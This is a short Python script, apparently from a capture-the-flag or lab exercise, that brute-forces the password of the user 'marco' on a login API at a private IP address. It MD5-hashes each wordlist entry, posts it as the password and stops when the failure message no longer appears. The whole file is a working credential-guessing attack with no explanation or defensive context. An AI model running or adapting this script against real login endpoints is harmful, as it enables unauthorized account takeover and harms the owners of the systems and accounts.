import requests
import sys
import json
import hashlib

wordlist_location = "/home/rajanrajan/wordlist.txt"
user = "marco"
url = "http://10.10.70.129/api/login"
headers = {"Accept": "application/json"}

with open(wordlist_location,"r") as file:
 for line in file.readlines():
  hash_ob = hashlib.md5(line.strip().encode())
  hash_pass = hash_ob.hexdigest()
  print("Trying : " + hash_pass,end="\r",flush=True)
  data = { "username": user,
           "password": hash_pass}
  r = requests.post(url,json=data,headers=headers)
  if "Incorrect Username or Password" not in r.text:
   print("password found for ",user,":",line)
   exit(0)

print("finished")
